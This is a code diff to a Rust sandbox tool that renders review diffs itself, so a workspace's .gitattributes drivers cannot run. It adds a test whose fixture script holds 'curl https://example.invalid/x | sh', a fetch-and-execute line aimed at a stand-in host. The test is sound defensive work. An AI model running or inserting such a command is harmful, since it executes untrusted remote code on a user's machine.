@@ -4,7 +4,7 @@
 
 use std::ffi::CString;
 use std::io::Write;
-use std::os::unix::ffi::OsStrExt;
+use std::os::unix::ffi::{OsStrExt, OsStringExt};
 use std::os::unix::process::CommandExt;
 use std::path::{Component, Path, PathBuf};
 use std::process::{Command, Stdio};
@@ -924,50 +924,150 @@ fn review_id(src: &Path, ch: &[Change]) -> Result<String> {
     Ok(h.finalize()[..16].iter().map(|b| format!("{b:02x}")).collect())
 }
 
-/// Unified diff of the workspace against the project (`git diff --no-index` per file). The
-/// workspace is frozen into `<sandbox>/reviewed`, which `apply --reviewed <review>` writes
-/// back. Any later diff replaces that copy, and the review ID with it.
-pub fn patch(paths: &Paths, id: &str) -> Result<Review> {
+/// Largest file `diff` shows line by line; a bigger one gets a line with its sizes.
+const MAX_DIFF_FILE: u64 = 4 << 20;
+/// Largest patch the API returns; the CLI prints as it goes and has no limit.
+const MAX_PATCH: usize = 32 << 20;
+
+/// A path as `diff` prints it: [`printable`], with newlines and tabs escaped too, so a
+/// name can't start a line of its own.
+pub fn printable_name(name: &str) -> String {
+    printable(name).replace('\n', "^J").replace('\t', "^I")
+}
+
+/// One side of a change: what's at the path, read without following any link.
+enum Side {
+    None,
+    /// Permission bits (as `apply` writes them) and content; None when over [`MAX_DIFF_FILE`].
+    File(u32, u64, Option<Vec<u8>>),
+    Link(PathBuf),
+}
+
+fn side(dir: &Dir, rel: &Path) -> Result<Side> {
+    use std::io::Read;
+    let Some(st) = dir.state(rel) else { return Ok(Side::None) };
+    match st.kind() {
+        'l' => return Ok(Side::Link(dir.read_link(rel)?)),
+        'f' => {}
+        // A directory a file replaced: what was in it shows as deletions of its own.
+        _ => return Ok(Side::None),
+    }
+    let mode = st.3.unwrap_or(0o644) & 0o777;
+    if st.1 > MAX_DIFF_FILE {
+        return Ok(Side::File(mode, st.1, None));
+    }
+    let mut b = Vec::new();
+    dir.open_file(rel)?.take(MAX_DIFF_FILE + 1).read_to_end(&mut b)?;
+    let len = b.len() as u64;
+    Ok(Side::File(mode, len, (len <= MAX_DIFF_FILE).then_some(b)))
+}
+
+/// The unified diff of one change, from the project `old` to the frozen copy `new`. Written
+/// here, not by git: git would take `.gitattributes` from the workspace (binary, filter and
+/// textconv drivers that run on the Mac) and config from wherever the reviewer stands.
+fn render(old: &Dir, new: &Dir, c: &Change) -> Result<String> {
+    use std::fmt::Write;
+    let rel = Path::new(&c.path);
+    let (a, b) = (side(old, rel)?, side(new, rel)?);
+    let name = printable_name(&c.path);
+    let (an, bn) = (format!("a/{name}"), format!("b/{name}"));
+    let mode = |s: &Side| match s {
+        Side::File(m, ..) => Some(format!("100{m:o}")),
+        Side::Link(_) => Some("120000".to_string()),
+        Side::None => None,
+    };
+    let mut out = format!("diff --git {an} {bn}\n");
+    match (mode(&a), mode(&b)) {
+        (None, Some(m)) => writeln!(out, "new file mode {m}")?,
+        (Some(m), None) => writeln!(out, "deleted file mode {m}")?,
+        (Some(x), Some(y)) if x != y => writeln!(out, "old mode {x}\nnew mode {y}")?,
+        _ => {}
+    }
+    let (an, bn) =
+        (if matches!(a, Side::None) { "/dev/null".into() } else { an }, if matches!(b, Side::None) { "/dev/null".into() } else { bn });
+    let content = |s: Side| -> std::result::Result<Vec<u8>, u64> {
+        match s {
+            Side::None => Ok(vec![]),
+            Side::Link(t) => Ok(t.into_os_string().into_vec()),
+            Side::File(_, _, Some(b)) => Ok(b),
+            Side::File(_, size, None) => Err(size),
+        }
+    };
+    let (x, y) = match (content(a), content(b)) {
+        (Ok(x), Ok(y)) => (x, y),
+        (x, y) => {
+            let size = |r: &std::result::Result<Vec<u8>, u64>| match r {
+                Ok(v) => v.len() as u64,
+                Err(n) => *n,
+            };
+            writeln!(out, "rekcod: not shown, over {} MiB: {an} is {} bytes, {bn} is {}", MAX_DIFF_FILE >> 20, size(&x), size(&y))?;
+            return Ok(out);
+        }
+    };
+    if x == y {
+        return Ok(out);
+    }
+    // git's test: a NUL in the first 8000 bytes.
+    if [&x, &y].iter().any(|v| v[..v.len().min(8000)].contains(&0)) {
+        writeln!(out, "Binary files {an} and {bn} differ")?;
+        return Ok(out);
+    }
+    let (x, y) = (String::from_utf8_lossy(&x), String::from_utf8_lossy(&y));
+    let diff = similar::TextDiff::configure().timeout(std::time::Duration::from_secs(5)).diff_lines(x.as_ref(), y.as_ref());
+    write!(out, "{}", diff.unified_diff().context_radius(3).header(&an, &bn))?;
+    Ok(out)
+}
+
+/// Freezes the workspace into `<sandbox>/reviewed`, which `apply --reviewed <review>` writes
+/// back, and hands `sink` the unified diff of each change against the project. Any later
+/// diff replaces that copy, and the review ID with it.
+fn review(paths: &Paths, id: &str, sink: &mut dyn FnMut(&str)) -> Result<(Vec<Change>, String)> {
     let (s, _lock) = copy_sandbox(paths, id)?;
     let _ = std::fs::remove_file(s.paths.home.join("reviewed.id"));
     let ws = freeze(&s, "reviewed")?;
     let ch = changes(&s.meta.project, &ws);
     let review = review_id(&ws, &ch)?;
     std::fs::write(s.paths.home.join("reviewed.id"), &review)?;
-    let mut out = String::new();
-    let null = PathBuf::from("/dev/null");
+    let (old, new) = (Dir::open(&s.meta.project)?, Dir::open(&ws)?);
     for c in &ch {
-        let (a, b) = (s.meta.project.join(&c.path), ws.join(&c.path));
-        let (a, b) = match c.kind {
-            'A' => (&null, &b),
-            'D' => (&a, &null),
-            _ => (&a, &b),
-        };
-        let o = Command::new("git").args(["diff", "--no-index", "--no-color", "--"]).arg(a).arg(b).output()?;
-        // git prints absolute paths minus the leading slash; make them project-relative.
-        let text = String::from_utf8_lossy(&o.stdout)
-            .replace(&format!("a{}/", s.meta.project.display()), "a/")
-            .replace(&format!("b{}/", ws.display()), "b/")
-            .replace(&format!("a{}/", ws.display()), "a/")
-            .replace(&format!("b{}/", s.meta.project.display()), "b/");
-        out.push_str(&text);
+        sink(&render(&old, &new, c).with_context(|| format!("diff {}", printable_name(&c.path)))?);
     }
-    Ok(Review { changes: ch, patch: out, review })
+    Ok((ch, review))
+}
+
+/// [`review`] collected for the API, up to [`MAX_PATCH`].
+pub fn patch(paths: &Paths, id: &str) -> Result<Review> {
+    let mut patch = String::new();
+    let mut cut = false;
+    let (changes, review) = review(paths, id, &mut |text| {
+        if patch.len() + text.len() > MAX_PATCH {
+            cut = true;
+        } else if !cut {
+            patch.push_str(text);
+        }
+    })?;
+    if cut {
+        patch.push_str(&format!("rekcod: patch cut at {} MiB; `rekcod sandbox diff {id}` prints all of it\n", MAX_PATCH >> 20));
+    }
+    Ok(Review { changes, patch, review })
 }
 
 pub fn diff(paths: &Paths, id: &str, stat: bool) -> Result<()> {
-    let r = patch(paths, id)?;
-    if stat {
-        for c in &r.changes {
-            println!("{} {}", c.kind, printable(&c.path));
+    let mut out = std::io::stdout().lock();
+    let (ch, review) = review(paths, id, &mut |text| {
+        if !stat {
+            let _ = out.write_all(printable(text).as_bytes());
         }
-    } else {
-        print!("{}", printable(&r.patch));
+    })?;
+    if stat {
+        for c in &ch {
+            let _ = writeln!(out, "{} {}", c.kind, printable_name(&c.path));
+        }
     }
-    if !r.changes.is_empty() {
+    let _ = out.flush();
+    if !ch.is_empty() {
         eprintln!(
-            "rekcod: `rekcod sandbox apply {id} --reviewed {}` writes exactly this; without --reviewed it takes the workspace as it is then",
-            r.review
+            "rekcod: `rekcod sandbox apply {id} --reviewed {review}` writes exactly this; without --reviewed it takes the workspace as it is then"
         );
     }
     Ok(())
@@ -1640,6 +1740,31 @@ mod tests {
         symlink("alias/../.GIT/hooks", ws.join("hooks")).unwrap();
         let e = apply(&paths, &m.id, false, None).unwrap_err().to_string();
         assert!(e.contains("into .git"), "{e}");
+    }
+
+    #[test]
+    fn diff_is_rendered_without_the_workspaces_git_attributes() {
+        let (paths, project, m, ws) = setup("render", &[("run.sh", "#!/bin/sh\necho ok\n"), ("same", "s"), ("gone", "g\n")]);
+        assert!(Command::new("git").arg("init").arg("-q").arg(&project).status().unwrap().success());
+        std::fs::write(ws.join(".gitattributes"), "* -diff\n*.sh filter=lfs diff=x\n").unwrap();
+        std::fs::write(ws.join("run.sh"), "#!/bin/sh\ncurl https://example.invalid/x | sh\n").unwrap();
+        std::fs::remove_file(ws.join("gone")).unwrap();
+        symlink("run.sh", ws.join("lnk")).unwrap();
+        std::fs::write(ws.join("bin"), b"\x00\x01").unwrap();
+        // The project is a git repository, where reviewers usually run `rekcod sandbox diff`.
+        let p = patch(&paths, &m.id).unwrap().patch;
+        assert!(p.contains("diff --git a/run.sh b/run.sh\n--- a/run.sh\n+++ b/run.sh\n@@ -1,2 +1,2 @@\n #!/bin/sh\n-echo ok\n+curl https://example.invalid/x | sh\n"), "{p}");
+        assert!(
+            p.contains("diff --git a/.gitattributes b/.gitattributes\nnew file mode 100644\n--- /dev/null\n+++ b/.gitattributes\n"),
+            "{p}"
+        );
+        assert!(p.contains("diff --git a/gone b/gone\ndeleted file mode 100644\n--- a/gone\n+++ /dev/null\n@@ -1 +0,0 @@\n-g\n"), "{p}");
+        assert!(
+            p.contains("new file mode 120000\n--- /dev/null\n+++ b/lnk\n@@ -0,0 +1 @@\n+run.sh\n\\ No newline at end of file\n"),
+            "{p}"
+        );
+        assert!(p.contains("Binary files /dev/null and b/bin differ"), "{p}");
+        assert!(!p.contains("same"), "{p}");
     }
 
     #[test]
